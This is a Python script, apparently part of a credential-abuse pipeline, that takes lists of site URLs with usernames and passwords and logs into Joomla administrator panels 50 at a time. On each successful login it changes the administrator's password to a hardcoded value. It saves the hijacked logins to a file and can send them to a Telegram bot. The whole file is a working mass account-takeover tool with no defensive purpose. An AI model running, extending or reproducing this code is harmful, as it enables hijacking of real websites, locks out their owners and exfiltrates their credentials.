"""
joomla.py — Joomla Checker (High Performance)
===============================================
• aiohttp async — 50 concurrent checks
• Watches Filter/Joomla-Filter/ for new files dropped by down.py
• Login → change password → save valid to Joomla-Valid/
• Invalid entries are NOT saved
• No lib dependency, no config.json, no shell upload

Usage:
    python joomla.py                    # watch mode (default)
    python joomla.py path/to/file.txt   # single file mode
"""

import asyncio
import aiohttp
import aiofiles
import os
import re
import sys
import ssl
import time
import hashlib
from datetime import datetime
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

ua = UserAgent()

# ── Config ─────────────────────────────────────────────────────────────────────
NEW_PASSWORD  = "Mnizar@012"
TG_TOKEN      = ""
TG_CHAT_ID    = ""

CONCURRENCY   = 50
TIMEOUT       = aiohttp.ClientTimeout(total=15)

# ── Folders ────────────────────────────────────────────────────────────────────
WATCH_DIR     = "../Filter/Joomla-Filter"
VALID_DIR     = "../results-cms/Joomla-Valid"
PROCESSED_DIR = "../Filter/Joomla-Filter/processed"

for _d in [WATCH_DIR, VALID_DIR, PROCESSED_DIR]:
    os.makedirs(_d, exist_ok=True)

# ── SSL ────────────────────────────────────────────────────────────────────────
SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}


def log(tag: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [{tag}] {msg}", flush=True)


# ── Telegram ───────────────────────────────────────────────────────────────────

async def send_telegram(session: aiohttp.ClientSession, url: str, username: str, password: str):
    if not TG_TOKEN or not TG_CHAT_ID:
        return
    try:
        domain = re.findall(r'://(.*?)(?:/|:|$)', url)
        domain_str = domain[0] if domain else url
        text = (
            f"✅ *Joomla Valid*\n"
            f"🌐 Domain: `{domain_str}`\n"
            f"🔗 URL: `{url}`\n"
            f"👤 Username: `{username}`\n"
            f"🔑 Password: `{password}`"
        )
        await session.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "Markdown"},
            timeout=aiohttp.ClientTimeout(total=10)
        )
    except Exception as e:
        log("TELEGRAM", f"Failed: {e}")


# ── Entry parser ───────────────────────────────────────────────────────────────

def normalize_url(raw: str) -> str:
    raw = raw.strip()
    if raw and not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "https://" + raw
    return raw


def parse_entry(line: str):
    line = normalize_url(line.strip())
    if not line:
        return None, None, None
    try:
        if "|" in line:
            parts = line.split("|")
            if len(parts) >= 3:
                return parts[0].strip(), parts[1].strip(), parts[2].strip()
        else:
            scheme, rest = line.split("://", 1)
            parts = rest.split(":")
            if len(parts) >= 3:
                if parts[1].isdigit():
                    url  = f"{scheme}://{parts[0]}:{parts[1]}"
                    user = parts[2]
                    pwd  = ":".join(parts[3:]) if len(parts) > 3 else ""
                else:
                    url  = f"{scheme}://{parts[0]}"
                    user = parts[1]
                    pwd  = ":".join(parts[2:]) if len(parts) > 2 else ""
                return url.strip(), user.strip(), pwd.strip()
    except Exception:
        pass
    return None, None, None


# ── HTML form field helpers ────────────────────────────────────────────────────

def get_return(source):
    try:
        return re.findall(r'name="return".*value="(.*?)"', source)[0]
    except:
        return ""

def get_token(source):
    try:
        return re.findall(r'name="(.*?)".*value="1"', source)[0]
    except:
        return ""

def get_option(source):
    try:
        return re.findall(r'name="option".*value="(.*?)"', source)[0]
    except:
        return ""

def get_task(source):
    try:
        return re.findall(r'name="task".*value="(.*?)"', source)[0]
    except:
        return ""

def get_lang(source):
    try:
        return BeautifulSoup(source, "html.parser").find("select", {"name": "lang"}).find("option", selected=True).get("value")
    except:
        return ""

def get_csrf(source):
    try:
        return re.findall(r'"csrf\.token":"(.*?)"', source)[0]
    except:
        return ""


# ── Core async checker ─────────────────────────────────────────────────────────

async def check_entry(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore,
                       url: str, username: str, password: str) -> bool:
    async with semaphore:
        admin_url = url + "/administrator/index.php"

        # ── Step 1: Get login page (tokens) ───────────────────────────────────
        try:
            async with session.get(admin_url, headers=HEADERS, ssl=SSL_CTX) as resp:
                login_page = await resp.text()
        except Exception as e:
            log("Joomla", f"⚠️  Get page error → {url} : {e}")
            return False

        # ── Step 2: POST login ────────────────────────────────────────────────
        try:
            token_key = get_token(login_page)
            post_data = {
                "username": username,
                "passwd":   password,
                "lang":     get_lang(login_page),
                "option":   get_option(login_page),
                "task":     get_task(login_page),
                "return":   get_return(login_page),
            }
            if token_key:
                post_data[token_key] = "1"

            async with session.post(
                admin_url, data=post_data,
                headers=HEADERS, ssl=SSL_CTX,
                allow_redirects=False
            ) as resp:
                login_status = resp.status
        except Exception as e:
            log("Joomla", f"⚠️  Login post error → {url} : {e}")
            return False

        # ── Step 3: Verify login ──────────────────────────────────────────────
        try:
            async with session.get(admin_url, headers=HEADERS, ssl=SSL_CTX) as resp:
                check_page = await resp.text()
        except Exception as e:
            log("Joomla", f"⚠️  Check page error → {url} : {e}")
            return False

        if not (login_status == 303 and "logout" in check_page):
            log("Joomla", f"❌ Login failed  → {url}")
            return False

        log("Joomla", f"✅ Logged in    → {url} ({username})")

        # ── Step 4: Get user ID ───────────────────────────────────────────────
        try:
            user_ids = re.findall(r'profile\.edit&amp;id=(.*?)"', check_page)
            if not user_ids:
                log("Joomla", f"⚠️  No user ID found → {url}")
                return False
            user_id = user_ids[0]

            async with session.get(
                f"{url}/administrator/index.php?option=com_admin&view=profile&layout=edit&id={user_id}",
                headers=HEADERS, ssl=SSL_CTX
            ) as resp:
                profile_page = await resp.text()
        except Exception as e:
            log("Joomla", f"⚠️  Profile page error → {url} : {e}")
            return False

        # ── Step 5: Change password ───────────────────────────────────────────
        try:
            csrf = get_csrf(profile_page)
            change_data = {
                "jform[name]":         re.findall(r'jform_name".*value="(.*?)"', profile_page)[0],
                "jform[username]":     re.findall(r'jform_username".*value="(.*?)"', profile_page)[0],
                "jform[password]":     NEW_PASSWORD,
                "jform[password2]":    NEW_PASSWORD,
                "jform[email]":        re.findall(r'jform_email".*value="(.*?)"', profile_page)[0],
                "jform[registerDate]": re.findall(r'jform\[registerDate\]".*value="(.*?)"', profile_page)[0],
                "jform[lastvisitDate]":re.findall(r'jform\[lastvisitDate\]".*value="(.*?)"', profile_page)[0],
                "jform[id]":           re.findall(r'jform_id".*value="(.*?)"', profile_page)[0],
                "task":                "profile.apply",
            }
            if csrf:
                change_data[csrf] = "1"

            async with session.post(
                f"{url}/administrator/index.php?option=com_admin&view=profile&layout=edit&id={user_id}",
                data=change_data, headers=HEADERS, ssl=SSL_CTX,
                allow_redirects=False
            ) as resp:
                change_status = resp.status
        except Exception as e:
            log("Joomla", f"⚠️  Change post error → {url} : {e}")
            return False

        # ── Step 6: Verify change ─────────────────────────────────────────────
        try:
            async with session.get(
                f"{url}/administrator/index.php?option=com_admin&view=profile&layout=edit",
                headers=HEADERS, ssl=SSL_CTX
            ) as resp:
                verify_page = await resp.text()
        except Exception as e:
            log("Joomla", f"⚠️  Verify error → {url} : {e}")
            return False

        if change_status == 303 and 'alert-success"' in verify_page:
            log("Joomla", f"🔑 Pwd changed  → {url}")
            await send_telegram(session, url, username, NEW_PASSWORD)
            async with aiofiles.open(
                os.path.join(VALID_DIR, "valid.txt"), "a", encoding="utf-8"
            ) as f:
                await f.write(f"{url}/administrator/index.php|{username}|{NEW_PASSWORD}\n")
            return True
        else:
            log("Joomla", f"⚠️  Pwd change failed → {url}")
            return False


# ── File processor ─────────────────────────────────────────────────────────────

async def process_file(file_path: str):
    log("WATCH", f"📄 New file: {file_path}")

    async with aiofiles.open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        raw_lines = await f.readlines()

    entries = []
    for line in raw_lines:
        url, username, password = parse_entry(line)
        if url:
            entries.append((url, username, password))
        else:
            log("PARSE", f"⚠️  Skipping: {line.strip()}")

    if not entries:
        log("WATCH", "No valid entries found.")
    else:
        log("WATCH", f"🚀 Checking {len(entries)} entries with {CONCURRENCY} concurrent workers...")

        semaphore = asyncio.Semaphore(CONCURRENCY)
        connector = aiohttp.TCPConnector(ssl=SSL_CTX, limit=CONCURRENCY + 10)

        async with aiohttp.ClientSession(connector=connector, timeout=TIMEOUT) as session:
            tasks   = [check_entry(session, semaphore, u, usr, pwd) for u, usr, pwd in entries]
            results = await asyncio.gather(*tasks, return_exceptions=True)

        valid = sum(1 for r in results if r is True)
        log("WATCH", f"Done — ✅ {valid}/{len(entries)} changed.")

    dest = os.path.join(PROCESSED_DIR, os.path.basename(file_path))
    os.replace(file_path, dest)
    log("WATCH", f"Moved to processed: {dest}")


# ── Watcher ────────────────────────────────────────────────────────────────────

def file_hash(path: str) -> str:
    h = hashlib.md5()
    with open(path, "rb") as f:
        h.update(f.read(4096))
    return h.hexdigest()


async def watch():
    log("WATCH", f"👀 Listening on '{WATCH_DIR}/' ... (Ctrl+C to stop)")
    seen = {}
    while True:
        try:
            for fname in os.listdir(WATCH_DIR):
                if not fname.endswith(".txt"):
                    continue
                fpath = os.path.join(WATCH_DIR, fname)
                if not os.path.isfile(fpath):
                    continue
                fhash = file_hash(fpath)
                if seen.get(fname) == fhash:
                    continue
                seen[fname] = fhash
                await process_file(fpath)
        except KeyboardInterrupt:
            log("WATCH", "Stopped.")
            break
        except Exception as e:
            log("ERROR", str(e))
        await asyncio.sleep(3)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(process_file(sys.argv[1]))
    else:
        asyncio.run(watch())